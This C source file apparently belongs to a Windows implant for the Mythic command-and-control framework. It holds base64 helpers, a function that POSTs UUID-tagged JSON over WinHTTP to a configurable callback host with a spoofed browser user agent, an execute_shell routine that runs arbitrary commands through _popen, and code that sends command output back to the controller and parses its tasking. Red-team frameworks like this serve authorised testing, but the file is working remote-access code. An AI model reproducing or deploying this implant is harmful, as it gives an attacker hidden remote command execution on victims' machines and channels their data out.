#define _WIN32_WINNT 0x0600
#include "utils.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>

extern char current_uuid[128];

#ifndef CALLBACK_HOST
#define CALLBACK_HOST "127.0.0.1"
#endif

#ifndef CALLBACK_PORT
#define CALLBACK_PORT 80
#endif

#ifndef SLEEP_TIME
#define SLEEP_TIME 5
#endif

#ifndef USER_AGENT
#define USER_AGENT                                                             \
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like " \
  "Gecko) Chrome/58.0.3029.110 Safari/537.36"
#endif

#ifndef POST_URI
#define POST_URI "/api/v1"
#endif

#if DEBUG
#define DEBUG_PRINT(...)                                                       \
  do {                                                                         \
    fprintf(stdout, "[DEBUG] ");                                               \
    fprintf(stdout, __VA_ARGS__);                                              \
    fprintf(stdout, "\n");                                                     \
    fflush(stdout);                                                            \
  } while (0)
#else
#define DEBUG_PRINT(...)                                                       \
  do {                                                                         \
  } while (0)
#endif

// Base64 logic
static const char base64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static int b64_inv[256];
static int b64_inv_init = 0;

char *base64_encode(const unsigned char *src, size_t len) {
  unsigned char *out, *pos;
  const unsigned char *end, *in;
  size_t olen;

  olen = len * 4 / 3 + 4;
  olen += olen / 72;
  olen++;
  out = (char *)malloc(olen);
  if (out == NULL)
    return NULL;

  end = src + len;
  in = src;
  pos = (unsigned char *)out;
  while (end - in >= 3) {
    *pos++ = base64_table[in[0] >> 2];
    *pos++ = base64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
    *pos++ = base64_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];
    *pos++ = base64_table[in[2] & 0x3f];
    in += 3;
  }

  if (end - in) {
    *pos++ = base64_table[in[0] >> 2];
    if (end - in == 1) {
      *pos++ = base64_table[(in[0] & 0x03) << 4];
      *pos++ = '=';
      *pos++ = '=';
    } else {
      *pos++ = base64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
      *pos++ = base64_table[(in[1] & 0x0f) << 2];
      *pos++ = '=';
    }
  }

  *pos = '\0';
  return out;
}

void init_b64_inv() {
  if (b64_inv_init)
    return;
  for (int i = 0; i < 256; i++)
    b64_inv[i] = -1;
  for (int i = 0; i < 64; i++)
    b64_inv[(unsigned char)base64_table[i]] = i;
  b64_inv_init = 1;
}

char *base64_decode(const char *src, size_t len) {
  init_b64_inv();
  char *out = (char *)malloc(len);
  int i = 0, j = 0;
  int v = 0;
  int bits = 0;
  for (i = 0; i < len; i++) {
    if (src[i] == '\0')
      break;
    int val = b64_inv[(unsigned char)src[i]];
    if (val == -1)
      continue;
    v = (v << 6) | val;
    bits += 6;
    if (bits >= 8) {
      bits -= 8;
      out[j++] = (v >> bits) & 0xFF;
    }
  }
  out[j] = '\0';
  return out;
}

unsigned char *base64_decode_bin(const char *src, size_t len, size_t *out_len) {
  init_b64_inv();
  unsigned char *out = (unsigned char *)malloc(len);
  int i = 0, j = 0;
  int v = 0;
  int bits = 0;
  for (i = 0; i < len; i++) {
    if (src[i] == '\0')
      break;
    int val = b64_inv[(unsigned char)src[i]];
    if (val == -1)
      continue;
    v = (v << 6) | val;
    bits += 6;
    if (bits >= 8) {
      bits -= 8;
      out[j++] = (v >> bits) & 0xFF;
    }
  }
  if (out_len)
    *out_len = j;
  return out;
}

void log_error(const char *msg) {
#if DEBUG
  DWORD err = GetLastError();
  DEBUG_PRINT("%s. Error Code: %lu", msg, err);
#endif
}

char *send_c2_message(const char *json_msg) {
  HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
  char *response_buffer = NULL;

  DEBUG_PRINT("Sending C2 message: %s", json_msg);

  // Parse Host
  char host[256];
  strncpy(host, CALLBACK_HOST, sizeof(host) - 1);

  char *p = strstr(host, "://");
  char *actual_host = p ? p + 3 : host;

  // Use Unicode for WinHTTP
  wchar_t wUserAgent[512];
  mbstowcs(wUserAgent, USER_AGENT, 512);

  hSession = WinHttpOpen(wUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) {
    log_error("WinHttpOpen failed");
    return NULL;
  }

  wchar_t wHost[256];
  mbstowcs(wHost, actual_host, 256);

  hConnect = WinHttpConnect(hSession, wHost, CALLBACK_PORT, 0);
  if (!hConnect) {
    log_error("WinHttpConnect failed");
    WinHttpCloseHandle(hSession);
    return NULL;
  }

  wchar_t wObject[256];
  mbstowcs(wObject, POST_URI, 256);

  hRequest =
      WinHttpOpenRequest(hConnect, L"POST", wObject, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  if (!hRequest) {
    log_error("WinHttpOpenRequest failed");
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return NULL;
  }

#ifdef KRATOS_HEADERS
  if (strlen(KRATOS_HEADERS) > 0) {
    wchar_t wHeaders[4096];
    memset(wHeaders, 0, sizeof(wHeaders));
    size_t converted = mbstowcs(wHeaders, KRATOS_HEADERS, 4095);
    if (converted > 0) {
      WinHttpAddRequestHeaders(hRequest, wHeaders, -1L,
                               WINHTTP_ADDREQ_FLAG_ADD);
    }
  }
#endif

  // Prepend UUID to message (NO ENCRYPTION)
  size_t json_len = strlen(json_msg);
  char *b64_msg = NULL;

  size_t total_len = 36 + json_len;
  char *data_with_uuid = (char *)malloc(total_len + 1);

  if (data_with_uuid) {
    memcpy(data_with_uuid, current_uuid, 36);
    memcpy(data_with_uuid + 36, json_msg, json_len);
    data_with_uuid[total_len] = '\0';

    b64_msg = base64_encode((const unsigned char *)data_with_uuid, total_len);
    free(data_with_uuid);
  }

  if (!b64_msg) {
    log_error("Failed to encode message");
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return NULL;
  }

  DEBUG_PRINT("Sent B64 Msg (len: %lu): %.100s...",
              (unsigned long)strlen(b64_msg), b64_msg);

  BOOL bResults =
      WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, b64_msg,
                         strlen(b64_msg), strlen(b64_msg), 0);

  if (!bResults) {
    log_error("WinHttpSendRequest failed");
  } else {
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
      log_error("WinHttpReceiveResponse failed");
    } else {
      DWORD dwStatusCode = 0;
      DWORD dwSize = sizeof(dwStatusCode);
      if (WinHttpQueryHeaders(
              hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
              WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize,
              WINHTTP_NO_HEADER_INDEX)) {
        DEBUG_PRINT("HTTP Status Code: %lu", dwStatusCode);
      }
    }
  }

  if (bResults) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;

    do {
      dwSize = 0;
      if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
        log_error("WinHttpQueryDataAvailable failed");
        break;
      }
      DEBUG_PRINT("Data Available: %lu bytes", dwSize);

      if (dwSize == 0)
        break;

      char *file_buffer = (char *)malloc(dwSize + 1);
      if (!file_buffer)
        break;

      ZeroMemory(file_buffer, dwSize + 1);

      if (WinHttpReadData(hRequest, (LPVOID)file_buffer, dwSize,
                          &dwDownloaded)) {
        DEBUG_PRINT("Read Data: %lu bytes", dwDownloaded);
        if (response_buffer == NULL) {
          response_buffer = file_buffer;
        } else {
          size_t old_len = strlen(response_buffer);
          response_buffer =
              (char *)realloc(response_buffer, old_len + dwDownloaded + 1);
          memcpy(response_buffer + old_len, file_buffer, dwDownloaded);
          response_buffer[old_len + dwDownloaded] = 0;
          free(file_buffer);
        }
      } else {
        log_error("WinHttpReadData failed");
        free(file_buffer);
      }
    } while (dwSize > 0);
  }

  free(b64_msg);
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  if (hConnect)
    WinHttpCloseHandle(hConnect);
  if (hSession)
    WinHttpCloseHandle(hSession);

  if (response_buffer) {
    DEBUG_PRINT("Received response (len: %lu)",
                (unsigned long)strlen(response_buffer));
  } else {
    DEBUG_PRINT("No response received");
  }

  return response_buffer;
}

char *execute_shell(const char *cmd) {
  char path[2048];
  char *output = (char *)malloc(1);
  output[0] = 0;
  size_t total_len = 0;

  char cmd_full[2048];
  snprintf(cmd_full, sizeof(cmd_full), "%s 2>&1", cmd);

  FILE *pipe = _popen(cmd_full, "r");
  if (!pipe)
    return strdup("Failed to open pipe");

  while (fgets(path, sizeof(path), pipe) != NULL) {
    size_t len = strlen(path);
    output = (char *)realloc(output, total_len + len + 1);
    memcpy(output + total_len, path, len);
    total_len += len;
    output[total_len] = 0;
  }
  _pclose(pipe);
  return output;
}

char *ConsoleOutputToUTF8(const char *input) {
  if (!input)
    return strdup("");

  int wlen = MultiByteToWideChar(CP_OEMCP, 0, input, -1, NULL, 0);
  if (wlen == 0)
    return strdup(input);

  wchar_t *wstr = (wchar_t *)malloc(wlen * sizeof(wchar_t));
  if (!wstr)
    return strdup(input);

  MultiByteToWideChar(CP_OEMCP, 0, input, -1, wstr, wlen);

  int ulen = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
  if (ulen == 0) {
    free(wstr);
    return strdup(input);
  }

  char *utf8 = (char *)malloc(ulen);
  if (!utf8) {
    free(wstr);
    return strdup(input);
  }

  WideCharToMultiByte(CP_UTF8, 0, wstr, -1, utf8, ulen, NULL, NULL);
  free(wstr);

  return utf8;
}

void extract_json_string(const char *json, const char *key, char *buffer,
                         size_t buffer_size) {
  char key_pattern[64];
  snprintf(key_pattern, sizeof(key_pattern), "\"%s\"", key);

  char *key_ptr = strstr(json, key_pattern);
  if (!key_ptr)
    return;

  char *val_start = strchr(key_ptr, ':');
  if (!val_start)
    return;

  val_start = strchr(val_start, '"');
  if (!val_start)
    return;
  val_start++;

  size_t i = 0;
  const char *p = val_start;
  while (*p && i < buffer_size - 1) {
    if (*p == '"')
      break;

    if (*p == '\\') {
      p++;
      if (!*p)
        break;
      if (*p == 'n')
        buffer[i++] = '\n';
      else if (*p == 'r')
        buffer[i++] = '\r';
      else if (*p == 't')
        buffer[i++] = '\t';
      else if (*p == '"')
        buffer[i++] = '"';
      else if (*p == '\\')
        buffer[i++] = '\\';
      else
        buffer[i++] = *p;
    } else {
      buffer[i++] = *p;
    }
    p++;
  }
  buffer[i] = 0;
}

char *json_escape(const char *str) {
  if (!str)
    return strdup("");

  size_t len = strlen(str);
  size_t new_len = len * 2 + 1;
  char *escaped = (char *)malloc(new_len);
  if (!escaped)
    return strdup("");

  size_t j = 0;
  for (size_t i = 0; i < len; i++) {
    unsigned char c = (unsigned char)str[i];
    if (c == '"') {
      escaped[j++] = '\\';
      escaped[j++] = '"';
    } else if (c == '\\') {
      escaped[j++] = '\\';
      escaped[j++] = '\\';
    } else if (c == '\n') {
      escaped[j++] = '\\';
      escaped[j++] = 'n';
    } else if (c == '\r') {
    } else if (c == '\t') {
      escaped[j++] = '\\';
      escaped[j++] = 't';
    } else if (c < 32) {
      escaped[j++] = '.';
    } else {
      escaped[j++] = c;
    }
  }
  escaped[j] = 0;
  return escaped;
}

void send_task_response(const char *task_id, const char *raw_output) {
  char *utf8_output = ConsoleOutputToUTF8(raw_output);
  char *escaped_output = json_escape(utf8_output ? utf8_output : "");

  size_t resp_len = strlen(escaped_output) + 512 + strlen(task_id);
  char *resp_msg = (char *)malloc(resp_len);

  if (resp_msg) {
    snprintf(resp_msg, resp_len,
             "{\"action\": \"post_response\", \"responses\": "
             "[{\"task_id\": \"%s\", \"user_output\": \"%s\", "
             "\"status\": \"success\", \"completed\": true}]}",
             task_id, escaped_output);

    char *resp = send_c2_message(resp_msg);
    if (resp)
      free(resp); // Fix leak
    free(resp_msg);
  }

  free(escaped_output);
  free(utf8_output);
}

char *process_mythic_response(const char *b64_resp, size_t b64_len) {
  if (!b64_resp || b64_len == 0)
    return NULL;

  size_t decoded_len = 0;
  unsigned char *full_decoded =
      base64_decode_bin(b64_resp, b64_len, &decoded_len);
  if (!full_decoded)
    return NULL;

  char *json_out = NULL;

  if (decoded_len > 36) {
    // NO DECRYPTION - extract JSON after UUID
    size_t json_len = decoded_len - 36;
    json_out = (char *)malloc(json_len + 1);
    if (json_out) {
      memcpy(json_out, full_decoded + 36, json_len);
      json_out[json_len] = '\0';
    }
  } else if (decoded_len > 0 && full_decoded[0] == '{') {
    // Fallback for raw JSON
    size_t json_len = decoded_len;
    json_out = (char *)malloc(json_len + 1);
    if (json_out) {
      memcpy(json_out, full_decoded, json_len);
      json_out[json_len] = '\0';
    }
  }

  free(full_decoded);
  return json_out;
}
